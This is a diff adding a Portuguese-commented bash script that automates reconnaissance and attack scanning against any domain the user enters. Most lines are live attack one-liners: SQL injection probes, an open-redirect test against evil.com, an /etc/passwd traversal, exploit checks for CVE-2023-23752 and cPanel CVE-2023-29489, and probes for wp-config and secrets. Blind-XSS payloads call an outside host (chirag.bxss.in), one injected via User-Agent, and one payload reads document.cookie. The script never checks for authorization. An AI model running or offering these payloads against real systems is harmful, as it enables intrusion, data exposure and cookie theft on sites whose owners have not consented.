@@ -1,0 +1,143 @@
+# iniciando robo
+
+echo "ROBO_dglp" | notify -silent
+echo "Certifique-se de ter as tools pre-instaladas para um bom funcionamento:"
+echo "subfinder/anew/httpx/naabu/katana/gf/dalfox/gauplus/nuclei/ripgen/trufflehog/reconftw"
+echo "Digite o dominio:"
+read DOMINIO
+
+
+# criando a pasta
+
+mkdir $DOMINIO 
+cd $DOMINIO
+
+
+# Inciando
+
+echo "Iniciando Recon/Scan:" | notify -silent
+echo $DOMINIO | notify -silent
+subfinder -d $DOMINIO -all -silent |  anew domains
+cat domains | httpx -silent | anew 200http 
+cat domains | naabu -ports-top 100 -silent | anew portsDomains
+cat portsDomains | nmap -T4 -F -sV -sS | anew res_nmap
+echo "Enumeracao inicial finalizada:" | notify -silent
+wc -l * | notify -silent
+
+
+# Google Dorks
+
+echo "Inicializando Google Dorks:" | notify -silent
+/root/BB/./GOOGLEdorks.sh $DOMINIO | anew /root/BB/$DOMINIO/res_gdorks
+cat res_gdorks | wc -l | notify -silent
+
+
+# Recon of Recon
+
+cd /root/BB/$DOMINIO/
+echo "Inicializando Recon of Recon:" | notify -silent
+cat 200http | katana -d 5 -silent | anew crawlinkURLS 
+cat crawlinkURLS | gf xss | anew xssCrawling 
+cat 200http | katana -jc | anew fileCrawling 
+cat crawlinkURLS | gauplus | gf takeovers | anew res_takeovers 
+cat crawlinkURLS | gauplus | gf ssti | anew res_ssti 
+cat crawlinkURLS | gauplus | gf sqli | anew res_sqli 
+cat crawlinkURLS | gauplus | gf ssrf | anew res_ssrf 
+cat crawlinkURLS | gauplus | gf redirects | anew res_redirects 
+cat crawlinkURLS | gauplus | gf lfi | anew res_lfi 
+cat crawlinkURLS | gauplus | gf php-erros | anew res_phperros
+cat crawlinkURLS | gauplus | gf aws-keys | anew res_awskeys
+cat crawlinkURLS | gf sqli | anew res_xsssqli 
+grep "=" res_xsssqli | qsreplace "' OR '1" | httpx -silent -store-response-dir res_outputSQL -threads 100 | grep -q -rn "syntax\|mysql" res_outputSQL 2>/dev/null
+find /root/BB/res_outputSQL/ -type f -name '*$DOMINIO*' | grep '$DOMINIO' | xargs mv -t /root/BB/$DOMINIO/
+echo "Recon of Recon finalizado:" | notify -silent
+wc -l * | notify -silent
+
+# Onliners
+cd /root/BB/$DOMINIO/
+echo "Inicializando Scan de On-Liners:" | notify -silent
+
+# OPEN redirect
+
+waybackurls $DOMINIO | grep -a -i \=http | qsreplace 'http://evil.com/' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done | anew ol_redirect
+
+subfinder -dL domains | httprobe |tee ol_livedomain.txt; cat ol_livedomain.txt | waybackurls | tee ol_wayback.txt; cat ol_wayback.txt | sort -u | grep "\?" > ol_open.txt; nuclei -t /root/nuclei-templates/ -etags ssl -severity low,medium,high,critical -l ol_open.txt | anew ol_redirect2
+
+# NGINX Path Traversal
+
+httpx -l crawlinkURLS -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | anew ol_nginx
+
+# Subdomain Takeover
+
+subfinder -d $DOMINIO >> FILE; assetfinder --subs-only $DOMINIO >> FILE; amass enum -norecursive -noalts -d $DOMINIO >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/cybertix/subjack/fingerprints.json -v 3 >> ol_takeover ;
+
+# Extract URLs from Source Code
+
+curl "$DOMINIO" | grep -oP '(https*.//|www\.)[^]*' | anew ol_extractURL
+
+# XSS (Cross-Site Scripting)
+
+echo $DOMINIO | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml -silent | dalfox pipe --skip-bav | anew ol_xss
+
+waybackurls $DOMINIO | gf xss | sed 's/=.*/=/' | sort -u | tee XSS.txt && cat XSS.txt | dalfox -b http://chirag.bxss.in pipe | anew ol_xss2
+
+cat domains | waybackurls | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>" | anew ol_xss3
+
+# Find Endpoints in JS
+
+katana -u $DOMINIO -js-crawl -d 5 -hl -filed ol_endpoint | anew ol_endpoint
+
+# OneLiner for CVE-2023-23752
+
+subfinder -d $DOMINIO -silent -all | httpx -silent -path 'api/index.php/v1/config/application?public=true' -mc 200 | anew ol_cve
+
+# cPanel CVE-2023-29489 XSS One-Liner
+
+subfinder -d $DOMINIO -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path '/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaaaaaaa' -mc 400 | anew ol_cvexss
+
+# WP-Config Oneliner
+
+subfinder -silent -d $DOMINIO | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path "/wp-config.PHP" -mc 200 -t 60 -status-code | anew ol_wpcfg
+
+# JS Secret Finder Oneliner
+
+echo $DOMINIO | gau | grep ".js" | httpx -content-type | grep 'application/javascript' | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent | anew ol_jssecrets
+
+# Easiest Information Disclosure in JSON body
+
+cat domains | waybackurls | httpx -mc 200 -ct | grep application/json | anew ol_eidj
+
+# Pegar FUZZ
+
+xargs -a domains -I@ sh -c 'python3 /root/ParamSpider/paramspider.py -d @ -l high' | anew ol_Fuzz
+
+cat ol_Fuzz | httpx | anew ol_Fuzz2
+
+cat ol_Fuzz2 | grep FUZZ | qsreplace '"><input autofocus nope="%26quot;x%26quot;"onfocus="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">' | /root/go/bin/./airixss -payload "confirm(1)" | egrep -v 'Not vulnerable' | anew ol_xss4
+
+# Memory dump and env disclosure
+# shodan search org: "vulnweb.com" http.favicon.hash:116323821 --fields ip_str,port--separator | awk '{print $1 $2}' | anew ol_shodan
+
+wc -l * | notify -silent
+
+# Scan
+
+cd /root/BB/$DOMINIO/
+echo "Inicializando Scan de Vulnerabilidades (demora):" | notify -silent
+echo "Inicializando Scan Dalfox:" | notify -silent
+cat xssCrawling | gf xss | dalfox pipe --skip-bav --mining-dom --deep-domxss --output-all --report | anew res_dalfox 
+echo "Dalfox finalizado:" | notify -silent
+cat res_dalfox | wc -l | notify -silent
+
+echo "Inicializando Scan Nuclei:" | notify -silent
+nuclei -up && nuclei -ut
+cat portsDomains | httpx -silent | nuclei -t /root/nuclei-templates/ -etags ssl -severity low,medium,high,critical | anew res_nuclei 
+echo "Nuclei finalizado:" | notify -silent
+cat res_nuclei | wc -l | notify -silent
+
+
+# FIM
+cd /root/BB/$DOMINIO/
+wc -l * | notify -silent
+echo 'Recon/Scan completo' | notify -silent
+echo $DOMINIO | notify -silent
